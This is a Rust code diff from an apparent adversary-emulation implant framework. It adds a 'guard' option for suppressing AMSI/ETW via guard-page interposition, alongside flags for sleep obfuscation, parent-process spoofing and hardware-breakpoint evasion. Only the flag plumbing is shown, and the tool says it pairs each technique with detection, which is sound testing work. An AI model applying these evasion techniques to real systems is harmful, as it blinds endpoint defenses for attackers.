@@ -1,6 +1,7 @@
 //! Phase 2 evasion primitives. Each capability maps to a registry technique
 //! (ABR-T005..T012) and ships with its detection counterpart.
 
+pub mod guard;
 pub mod hwbp;
 pub mod patch;
 pub mod sleep;
@@ -51,10 +52,20 @@ pub fn register_sensitive(ptr: usize, len: usize) {
 }
 
 static HWBP_REQUESTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
+static GUARD_REQUESTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
 
 /// Whether the operator opted into ABR-T036 (`--evasion ...hwbp`).
 pub fn hwbp_requested() -> bool {
     HWBP_REQUESTED.load(std::sync::atomic::Ordering::Relaxed)
+}
+
+/// Whether the operator opted into ABR-T041 (`--evasion ...guard`):
+/// guard-page AMSI/ETW interposition — patch-free AND DR-free, the
+/// variant that survives VBS/hypervisor builds. Preferred over the
+/// byte patch when set; the CLR path falls back to ABR-T024 if arming
+/// is refused.
+pub fn guard_requested() -> bool {
+    GUARD_REQUESTED.load(std::sync::atomic::Ordering::Relaxed)
 }
 
 /// Snapshot of the registered regions (called by the sleep cycle).
@@ -75,6 +86,11 @@ pub struct Flags {
     /// lab even where the isolated tests pass — opt in only on hosts
     /// known to honor DR writes.
     pub hwbp_suppression: bool,
+    /// Opt-in ABR-T041 (AMSI/ETW via guard-page interposition): no byte
+    /// patches, no debug registers — survives the VBS/hypervisor builds
+    /// that kill T036. Preferred over the T024 patch when set; arming
+    /// failures fall back to the patch.
+    pub guard_suppression: bool,
 }
 
 impl Flags {
@@ -85,12 +101,14 @@ impl Flags {
             ekko_sleep: false,
             spoofed_parent: false,
             hwbp_suppression: false,
+            guard_suppression: false,
         };
         for name in spec.split(',').map(str::trim).filter(|s| !s.is_empty()) {
             match name {
                 "ekko" => flags.ekko_sleep = true,
                 "ppid" => flags.spoofed_parent = true,
                 "hwbp" => flags.hwbp_suppression = true,
+                "guard" => flags.guard_suppression = true,
                 other => return Err(format!("unknown evasion flag '{other}'")),
             }
         }
@@ -111,6 +129,7 @@ impl Evasion {
                 ekko_sleep: false,
                 spoofed_parent: false,
                 hwbp_suppression: false,
+                guard_suppression: false,
             },
             ekko: None,
             spawner: None,
@@ -141,11 +160,15 @@ impl Evasion {
         self.flags.spoofed_parent
     }
 
-    /// Publishes the hwbp opt-in for the CLR task path (called once at
-    /// enable time).
+    /// Publishes the hwbp/guard opt-ins for the CLR task path (called
+    /// once at enable time).
     pub fn publish(&self) {
         HWBP_REQUESTED.store(
             self.flags.hwbp_suppression,
+            std::sync::atomic::Ordering::Relaxed,
+        );
+        GUARD_REQUESTED.store(
+            self.flags.guard_suppression,
             std::sync::atomic::Ordering::Relaxed,
         );
     }
